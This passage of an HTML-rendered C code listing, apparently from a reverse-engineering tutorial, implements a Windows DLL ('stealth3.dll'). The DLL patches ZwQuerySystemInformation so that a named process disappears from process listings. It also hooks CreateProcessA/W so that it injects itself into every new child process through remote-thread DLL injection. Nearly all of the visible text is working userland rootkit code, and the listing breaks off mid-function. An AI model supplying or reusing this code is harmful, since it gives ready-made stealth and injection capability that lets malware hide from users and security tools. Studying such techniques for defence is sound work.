class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_MODULE_NAME					(<span class="string">L&quot;stealth3.dll&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_HIDE_PROCESS_NAME			(<span class="string">L&quot;notepad.exe&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_SUCCESS					(0x00000000L) </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> LONG NTSTATUS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_SYSTEM_INFORMATION_CLASS</span> &#123;</span><br><span class="line">    SystemBasicInformation = <span class="number">0</span>,</span><br><span class="line">    SystemPerformanceInformation = <span class="number">2</span>,</span><br><span class="line">    SystemTimeOfDayInformation = <span class="number">3</span>,</span><br><span class="line">    SystemProcessInformation = <span class="number">5</span>,</span><br><span class="line">    SystemProcessorPerformanceInformation = <span class="number">8</span>,</span><br><span class="line">    SystemInterruptInformation = <span class="number">23</span>,</span><br><span class="line">    SystemExceptionInformation = <span class="number">33</span>,</span><br><span class="line">    SystemRegistryQuotaInformation = <span class="number">37</span>,</span><br><span class="line">    SystemLookasideInformation = <span class="number">45</span></span><br><span class="line">&#125; SYSTEM_INFORMATION_CLASS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_PROCESS_INFORMATION</span> &#123;</span><br><span class="line">    ULONG NextEntryOffset;</span><br><span class="line">    BYTE Reserved1[<span class="number">52</span>];</span><br><span class="line">    PVOID Reserved2[<span class="number">3</span>];</span><br><span class="line">    HANDLE UniqueProcessId;</span><br><span class="line">    PVOID Reserved3;</span><br><span class="line">    ULONG HandleCount;</span><br><span class="line">    BYTE Reserved4[<span class="number">4</span>];</span><br><span class="line">    PVOID Reserved5[<span class="number">11</span>];</span><br><span class="line">    SIZE_T PeakPagefileUsage;</span><br><span class="line">    SIZE_T PrivatePageCount;</span><br><span class="line">    LARGE_INTEGER Reserved6[<span class="number">6</span>];</span><br><span class="line">&#125; SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(WINAPI *PFZWQUERYSYSTEMINFORMATION)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    SYSTEM_INFORMATION_CLASS SystemInformationClass, </span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID SystemInformation, </span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG SystemInformationLength, </span></span></span><br><span class="line"><span class="params"><span class="function">    PULONG ReturnLength)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span> <span class="params">(WINAPI *PFCREATEPROCESSA)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpApplicationName,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPTSTR lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSTARTUPINFO lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span> <span class="params">(WINAPI *PFCREATEPROCESSW)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpApplicationName,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPTSTR lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSTARTUPINFO lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line">BYTE g_pOrgZwQSI[<span class="number">5</span>] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">hook_by_code</span><span class="params">(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FARPROC pFunc;</span><br><span class="line">	DWORD dwOldProtect, dwAddress;</span><br><span class="line">	BYTE pBuf[<span class="number">5</span>] = &#123;<span class="number">0xE9</span>, <span class="number">0</span>, &#125;;</span><br><span class="line">	PBYTE pByte;</span><br><span class="line"></span><br><span class="line">	pFunc = (FARPROC)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(szDllName), szFuncName);</span><br><span class="line">	pByte = (PBYTE)pFunc;</span><br><span class="line">	<span class="keyword">if</span>( pByte[<span class="number">0</span>] == <span class="number">0xE9</span> )</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">VirtualProtect</span>((LPVOID)pFunc, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">	<span class="built_in">memcpy</span>(pOrgBytes, pFunc, <span class="number">5</span>);</span><br><span class="line">	dwAddress = (DWORD)pfnNew - (DWORD)pFunc - <span class="number">5</span>;</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;pBuf[<span class="number">1</span>], &amp;dwAddress, <span class="number">4</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(pFunc, pBuf, <span class="number">5</span>);</span><br><span class="line">	<span class="built_in">VirtualProtect</span>((LPVOID)pFunc, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	szDllName:kernel32.dll</span></span><br><span class="line"><span class="comment">	szFuncName:CreateProcessA</span></span><br><span class="line"><span class="comment">	pfnNew:NewCreateProcessA</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">BOOL <span class="title">hook_by_hotpatch</span><span class="params">(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FARPROC pFunc;</span><br><span class="line">	DWORD dwOldProtect, dwAddress;</span><br><span class="line">	BYTE pBuf[<span class="number">5</span>] = &#123; <span class="number">0xE9</span>, <span class="number">0</span>, &#125;;</span><br><span class="line">    BYTE pBuf2[<span class="number">2</span>] = &#123; <span class="number">0xEB</span>, <span class="number">0xF9</span> &#125;;</span><br><span class="line">	PBYTE pByte;</span><br><span class="line"></span><br><span class="line">	pFunc = (FARPROC)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(szDllName), szFuncName);</span><br><span class="line">	pByte = (PBYTE)pFunc;</span><br><span class="line">	<span class="keyword">if</span>( pByte[<span class="number">0</span>] == <span class="number">0xEB</span> )</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">VirtualProtect</span>((LPVOID)((DWORD)pFunc - <span class="number">5</span>), <span class="number">7</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. NOP (0x90)</span></span><br><span class="line">	dwAddress = (DWORD)pfnNew - (DWORD)pFunc;</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;pBuf[<span class="number">1</span>], &amp;dwAddress, <span class="number">4</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>((LPVOID)((DWORD)pFunc - <span class="number">5</span>), pBuf, <span class="number">5</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. MOV EDI, EDI (0x8BFF)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(pFunc, pBuf2, <span class="number">2</span>);</span><br><span class="line">	<span class="built_in">VirtualProtect</span>((LPVOID)((DWORD)pFunc - <span class="number">5</span>), <span class="number">7</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">unhook_by_code</span><span class="params">(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FARPROC pFunc;</span><br><span class="line">	DWORD dwOldProtect;</span><br><span class="line">	PBYTE pByte;</span><br><span class="line"></span><br><span class="line">	pFunc = (FARPROC)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(szDllName), szFuncName);</span><br><span class="line">	pByte = (PBYTE)pFunc;</span><br><span class="line">	<span class="keyword">if</span>( pByte[<span class="number">0</span>] != <span class="number">0xE9</span> )</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">VirtualProtect</span>((LPVOID)pFunc, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">	<span class="built_in">memcpy</span>(pFunc, pOrgBytes, <span class="number">5</span>);</span><br><span class="line">	<span class="built_in">VirtualProtect</span>((LPVOID)pFunc, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">unhook_by_hotpatch</span><span class="params">(LPCSTR szDllName, LPCSTR szFuncName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FARPROC pFunc;</span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    PBYTE pByte;</span><br><span class="line">    BYTE pBuf[<span class="number">5</span>] = &#123; <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span> &#125;;</span><br><span class="line">    BYTE pBuf2[<span class="number">2</span>] = &#123; <span class="number">0x8B</span>, <span class="number">0xFF</span> &#125;;</span><br><span class="line"></span><br><span class="line">    pFunc = (FARPROC)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(szDllName), szFuncName);</span><br><span class="line">    pByte = (PBYTE)pFunc;</span><br><span class="line">    <span class="keyword">if</span>( pByte[<span class="number">0</span>] != <span class="number">0xEB</span> )</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)pFunc, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">    <span class="comment">// 1. NOP (0x90)</span></span><br><span class="line">    <span class="built_in">memcpy</span>((LPVOID)((DWORD)pFunc - <span class="number">5</span>), pBuf, <span class="number">5</span>);</span><br><span class="line">    <span class="comment">// 2. MOV EDI, EDI (0x8BFF)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(pFunc, pBuf2, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)pFunc, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(),</span><br><span class="line">                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, </span><br><span class="line">			              &amp;hToken) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenProcessToken error: %u\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>,             <span class="comment">// lookup privilege on local system</span></span><br><span class="line">                              lpszPrivilege,    <span class="comment">// privilege to lookup </span></span><br><span class="line">                              &amp;luid) )          <span class="comment">// receives LUID of privilege</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LookupPrivilegeValue error: %u\n&quot;</span>, <span class="built_in">GetLastError</span>() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span>( bEnablePrivilege )</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">AdjustTokenPrivileges</span>(hToken, </span><br><span class="line">                               FALSE, </span><br><span class="line">                               &amp;tp, </span><br><span class="line">                               <span class="built_in">sizeof</span>(TOKEN_PRIVILEGES), </span><br><span class="line">                               (PTOKEN_PRIVILEGES) <span class="literal">NULL</span>, </span><br><span class="line">                               (PDWORD) <span class="literal">NULL</span>) )</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, <span class="built_in">GetLastError</span>() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">GetLastError</span>() == ERROR_NOT_ALL_ASSIGNED )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The token does not have the specified privilege. \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InjectDll2</span><span class="params">(HANDLE hProcess, LPCTSTR szDllName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	LPVOID pRemoteBuf;</span><br><span class="line">	DWORD dwBufSize = (DWORD)(_tcslen(szDllName) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line">	FARPROC pThreadProc;</span><br><span class="line"></span><br><span class="line">	pRemoteBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span>( pRemoteBuf == <span class="literal">NULL</span> )</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">WriteProcessMemory</span>(hProcess, pRemoteBuf, (LPVOID)szDllName, dwBufSize, <span class="literal">NULL</span>);</span><br><span class="line">	pThreadProc = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">	hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, </span><br><span class="line">                                 (LPTHREAD_START_ROUTINE)pThreadProc, </span><br><span class="line">                                 pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);	</span><br><span class="line">	<span class="built_in">VirtualFreeEx</span>(hProcess, pRemoteBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS WINAPI <span class="title">NewZwQuerySystemInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    SYSTEM_INFORMATION_CLASS SystemInformationClass, </span></span></span><br><span class="line"><span class="params"><span class="function">	PVOID SystemInformation, </span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG SystemInformationLength, </span></span></span><br><span class="line"><span class="params"><span class="function">	PULONG ReturnLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	NTSTATUS status;</span><br><span class="line">	FARPROC pFunc;</span><br><span class="line">	PSYSTEM_PROCESS_INFORMATION pCur, pPrev;</span><br><span class="line">	<span class="type">char</span> szProcName[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">unhook_by_code</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>, g_pOrgZwQSI);</span><br><span class="line"></span><br><span class="line">	pFunc = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwQuerySystemInformation&quot;</span>);</span><br><span class="line">	status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)</span><br><span class="line">             (SystemInformationClass, SystemInformation, </span><br><span class="line">              SystemInformationLength, ReturnLength);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( status != STATUS_SUCCESS )</span><br><span class="line">		<span class="keyword">goto</span> __NTQUERYSYSTEMINFORMATION_END;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( SystemInformationClass == SystemProcessInformation )</span><br><span class="line">	&#123;</span><br><span class="line">		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;</span><br><span class="line">		<span class="keyword">while</span>(TRUE)</span><br><span class="line">		&#123;</span><br><span class="line">            <span class="keyword">if</span>(pCur-&gt;Reserved2[<span class="number">1</span>] != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(!_tcsicmp((PWSTR)pCur-&gt;Reserved2[<span class="number">1</span>], STR_HIDE_PROCESS_NAME))</span><br><span class="line">			    &#123;</span><br><span class="line">				    <span class="keyword">if</span>(pCur-&gt;NextEntryOffset == <span class="number">0</span>)</span><br><span class="line">					    pPrev-&gt;NextEntryOffset = <span class="number">0</span>;</span><br><span class="line">				    <span class="keyword">else</span></span><br><span class="line">					    pPrev-&gt;NextEntryOffset += pCur-&gt;NextEntryOffset;</span><br><span class="line">			    &#125;</span><br><span class="line">			    <span class="keyword">else</span>		</span><br><span class="line">				    pPrev = pCur;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(pCur-&gt;NextEntryOffset == <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">			pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pCur + pCur-&gt;NextEntryOffset);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">__NTQUERYSYSTEMINFORMATION_END:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">hook_by_code</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>,  (PROC)NewZwQuerySystemInformation, g_pOrgZwQSI);</span><br><span class="line">	<span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">NewCreateProcessA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpApplicationName,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPTSTR lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSTARTUPINFO lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL bRet;</span><br><span class="line">    FARPROC pFunc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 original API</span></span><br><span class="line">    pFunc = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;CreateProcessA&quot;</span>);</span><br><span class="line">    pFunc = (FARPROC)((DWORD)pFunc + <span class="number">2</span>);</span><br><span class="line">    bRet = ((PFCREATEPROCESSA)pFunc)(lpApplicationName,</span><br><span class="line">                                     lpCommandLine,</span><br><span class="line">                                     lpProcessAttributes,</span><br><span class="line">                                     lpThreadAttributes,</span><br><span class="line">                                     bInheritHandles,</span><br><span class="line">                                     dwCreationFlags,</span><br><span class="line">                                     lpEnvironment,</span><br><span class="line">                                     lpCurrentDirectory,</span><br><span class="line">                                     lpStartupInfo,</span><br><span class="line">                                     lpProcessInformation);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向生成的子进程注入 stealth3.dll</span></span><br><span class="line">    <span class="keyword">if</span>( bRet )</span><br><span class="line">        <span class="built_in">InjectDll2</span>(lpProcessInformation-&gt;hProcess, STR_MODULE_NAME);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">NewCreateProcessW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpApplicationName,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPTSTR lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSTARTUPINFO lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL bRet;</span><br><span class="line">    FARPROC pFunc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用原始API</span></span><br><span class="line">    pFunc = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;CreateProcessW&quot;</span>);</span><br><span class="line">    pFunc = (FARPROC)((DWORD)pFunc + <span class="number">2</span>);</span><br><span class="line">    bRet = ((PFCREATEPROCESSW)pFunc)(lpApplicationName,</span><br><span class="line">                                     lpCommandLine,</span><br><span class="line">                                     lpProcessAttributes,</span><br><span class="line">                                     lpThreadAttributes,</span><br><span class="line">                                     bInheritHandles,</span><br><span class="line">                                     dwCreationFlags,</span><br><span class="line">                                     